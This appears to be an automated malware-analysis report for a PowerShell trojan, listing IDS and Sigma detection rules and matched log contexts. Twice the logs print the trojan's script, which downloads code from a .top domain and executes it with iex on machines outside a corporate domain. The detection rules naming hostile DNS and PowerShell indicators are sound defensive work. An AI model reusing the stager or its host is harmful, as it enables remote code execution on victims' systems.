threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

attributes.magic: ASCII text, with very long lines (65536u), with no line terminators

crowdsourced_ids_results.rule_raw: alert ( gid:119; sid:279; rev:1; msg:"(http_inspect) invalid status line"; metadata: rule-type preproc; classtype:unknown;)

crowdsourced_ids_results.rule_msg: ET INFO HTTP Request to a *.top domain
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO HTTP Request to a *.top domain"; flow:established,to_server; threshold:type limit, track by_src, count 1, seconds 30; http.host; content:".top"; fast_pattern; pcre:"/^(\x3a\d{1,5})?$/R"; reference:url,www.symantec.com/connect/blogs/shady-tld-research-gdn-and-our-2016-wrap; reference:url,www.spamhaus.org/statistics/tlds/; classtype:bad-unknown; sid:2023882; rev:5; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2017_02_07, deployment Perimeter, signature_severity Informational, updated_at 2022_11_21;)

crowdsourced_ids_results.rule_msg: ET DNS Query to a *.top domain - Likely Hostile
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET DNS Query to a *.top domain - Likely Hostile"; threshold:type limit, track by_src, count 1, seconds 30; dns.query; content:".top"; nocase; endswith; reference:url,www.symantec.com/connect/blogs/shady-tld-research-gdn-and-our-2016-wrap; reference:url,www.spamhaus.org/statistics/tlds/; classtype:bad-unknown; sid:2023883; rev:4; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2017_02_07, deployment Perimeter, signature_severity Major, updated_at 2020_09_15;)

crowdsourced_ids_results.rule_msg: ET INFO Windows Powershell User-Agent Usage
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Windows Powershell User-Agent Usage"; flow:established,to_server; http.user_agent; content:"Mozilla/"; startswith; content:") WindowsPowerShell/"; distance:0; fast_pattern; classtype:not-suspicious; sid:2033355; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_07_16, deployment Perimeter, confidence High, signature_severity Informational, updated_at 2021_07_16;)

alert udp $HOME_NET any -> any 53 ( msg:"INDICATOR-COMPROMISE Suspicious .top dns query"; flow:to_server; byte_test:1,!&,0xF8,2; content:"|03|top|00|",fast_pattern,nocase; service:dns; reference:url,en.wikipedia.org/wiki/.top; classtype:misc-activity; gid:1; sid:43687; rev:3; )

sigma_analysis_results.rule_title: Python Image Load By Non-Python Process
sigma_analysis_results.rule_description: Detects the image load of "Python Core" by a non-Python process. This might be indicative of a Python script bundled with Py2Exe.
sigma_analysis_results.rule_author: Patrick St. John, OTR (Open Threat Research)

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=${random_error_action_preference}="Stop";Set-Location $Env:AppData;${random_install_path}="$Env:AppData\UvDdFNOw";if(Test-Path ${random_install_path}){if(Test-Path "$Env:AppData\IJWVosrT.txt"){Remove-Item "$Env:AppData\IJWVosrT.txt"};Exit};$domain=(Get-WmiObject Win32_ComputerSystem).Domain;if($domain -eq $null -or $domain -eq "WORKGROUP"){$global:block = (Invoke-WebRequest -Uri "http://hkinuxb3bz.top/1.php?s=527" -UseBasicParsing).Content; iex $global:block; Exit};${random_encoded_data}="UEsDBB [TRUNCATED]; Path=C:\Users\george\Desktop\nALIELIz.ps1; ScriptBlockId=3fd70c15-afee-4c53-be55-8d75466198c0; MessageTotal=3208; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description:
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.
This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox

match_context.values: @{ScriptBlockText=${random_error_action_preference}="Stop";Set-Location $Env:AppData;${random_install_path}="$Env:AppData\UvDdFNOw";if(Test-Path ${random_install_path}){if(Test-Path "$Env:AppData\IJWVosrT.txt"){Remove-Item "$Env:AppData\IJWVosrT.txt"};Exit};$domain=(Get-WmiObject Win32_ComputerSystem).Domain;if($domain -eq $null -or $domain -eq "WORKGROUP"){$global:block = (Invoke-WebRequest -Uri "http://hkinuxb3bz.top/1.php?s=527" -UseBasicParsing).Content; iex $global:block; Exit};${random_encoded_data}="UEsDBB [TRUNCATED]; MessageTotal=3208; ScriptBlockId=3fd70c15-afee-4c53-be55-8d75466198c0; Path=C:\Users\george\Desktop\nALIELIz.ps1; EventID=4104; MessageNumber=1}
